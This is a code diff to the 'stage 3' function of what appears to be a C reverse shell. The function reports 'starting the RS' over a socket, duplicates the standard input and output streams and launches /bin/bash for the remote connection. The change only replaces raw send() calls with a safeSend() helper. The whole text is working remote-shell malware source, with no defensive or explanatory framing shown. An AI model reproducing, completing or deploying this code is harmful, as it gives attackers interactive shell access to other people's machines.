@@ -7,7 +7,6 @@
 
 void redirection(int connID){
         printf("[*] stage 3\n");
-        
 
         char buffer[1024] ={0};
         char *output;
@@ -15,7 +14,8 @@ void redirection(int connID){
         int RUN = 1;
         
         char *ok = "starting the RS";
-        send(connID, ok, strlen(ok),0);
+        safeSend(connID, ok);
+        //send(connID, ok, strlen(ok),0);
         
         int fdIN = dup(STDIN_FILENO);
         int fdOUT = dup(STDOUT_FILENO);
@@ -32,7 +32,8 @@ void redirection(int connID){
             execve("/bin/bash", argv, NULL);
                 
             char *e = "failed starting the RS";
-            send(connID, e, strlen(e),0);
+            safeSend(connID, e);
+            //send(connID, e, strlen(e),0);
                 
         }
         else{
@@ -47,7 +48,8 @@ void redirection(int connID){
             printf("rs closed");
             
             char *m = "rs closed";
-            send(connID, m, strlen(m),0);
+            safeSend(connID, m);
+            //send(connID, m, strlen(m),0);
             
             
         }
